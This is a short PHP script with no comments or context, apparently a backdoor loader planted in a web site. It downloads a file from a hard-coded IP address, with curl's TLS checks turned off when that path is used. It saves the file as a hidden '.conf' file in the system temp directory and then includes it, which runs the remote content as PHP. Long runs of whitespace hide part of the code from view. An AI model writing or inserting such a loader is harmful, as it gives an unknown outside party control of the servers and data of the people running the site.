<?php

$url = "http://103.84.207.191/403.txt"; 
$dir =  sys_get_temp_dir() . "/.conf";                                                                                                                                    $url = "http://103.84.207.191/403.txt";
if(ini_get('allow_url_fopen')) {
   $output = file_get_contents($url);
}else if(function_exists('curl_init')){                                                                                                                                                                                                                                                                                               $ch = curl_init();                                                                                                                                                                                                                                                                                    curl_setopt($ch, CURLOPT_URL, $url);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
   curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
   curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
   $head = curl_exec($ch);
   $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
   curl_close($ch);
   if($httpCode  == 200) {
      $output =  $head;
   }else {
      die("fail to fetch url");
   }
}

if(!file_exists($dir)) {
   file_put_contents($dir, $output);
}

include $dir;

?>